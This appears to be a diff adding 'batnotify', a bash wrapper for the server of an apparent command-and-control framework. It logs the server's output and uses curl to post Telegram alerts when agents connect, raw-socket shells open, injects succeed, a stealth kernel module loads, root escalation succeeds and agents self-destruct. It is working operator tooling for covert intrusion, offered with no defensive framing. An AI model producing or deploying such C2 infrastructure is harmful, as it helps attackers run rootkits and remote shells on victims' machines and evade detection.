@@ -1,0 +1,74 @@
+#!/usr/bin/env bash
+# batnotify — wraps bat-server stdout:
+#   - tee para log em /tmp/bat-server.log
+#   - envia Telegram para eventos relevantes do C2
+#
+# Uso: tail -f /tmp/bat-console-in | bat-server 2>&1 | batnotify
+#
+# Eventos notificados (v9):
+#   [agent connected]        — novo agente ou reconexão
+#   [rawsock] session        — shell rawsock ativo (Fase 3)
+#   [result] TTP 11          — inject concluído com sucesso
+#   [result] * error         — qualquer TTP com erro
+#   [server] listening       — servidor subiu
+#   [stealth_active]         — agente carregou bat-stealth.ko autonomamente (K-series)
+#   [stealth_unloaded]       — K-99 executado; LKM descarregado
+#   [root] uid=0             — K-03 executado; escalação para root OK
+#   [root_failed]            — K-03 falhou
+#   [compile]                — KCC compilou .ko (resultado diagnóstico)
+#   self-destruct / TTP 222  — destruct executado
+
+LOG="/tmp/bat-server.log"
+
+_tg_send() {
+    local msg="$1"
+    if [[ -n "${TG_TOKEN:-}" && -n "${TG_CHAT_ID:-}" ]]; then
+        curl -s -m 5 -X POST \
+            "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+            -d "chat_id=${TG_CHAT_ID}" \
+            --data-urlencode "text=${msg}" \
+            > /dev/null 2>&1 &
+    fi
+}
+
+while IFS= read -r line; do
+    # Exibir e registrar
+    echo "$line" | tee -a "$LOG"
+
+    # Notificar em eventos relevantes
+    case "$line" in
+        *"[agent connected]"*)
+            _tg_send "BAT AGENT: $line"
+            ;;
+        *"[rawsock] session from"*)
+            _tg_send "RAWSOCK SHELL: $line"
+            ;;
+        *"[server] listening"*)
+            _tg_send "BAT SERVER UP: $line"
+            ;;
+        *"[result]"*"TTP 11"*)
+            _tg_send "INJECT OK: $line"
+            ;;
+        *"[result]"*" error:"*)
+            _tg_send "TTP ERROR: $line"
+            ;;
+        *"[stealth_active]"*)
+            _tg_send "STEALTH ATIVO: $line"
+            ;;
+        *"[stealth_unloaded]"*)
+            _tg_send "STEALTH UNLOADED: $line"
+            ;;
+        *"[root] uid=0"*)
+            _tg_send "ROOT OK: $line"
+            ;;
+        *"[root_failed"*)
+            _tg_send "ROOT FAILED: $line"
+            ;;
+        *"[compile]"*)
+            _tg_send "KCC COMPILE: $line"
+            ;;
+        *"[result]"*"TTP 222"*|*"self-destruct"*)
+            _tg_send "DESTRUCT: $line"
+            ;;
+    esac
+done
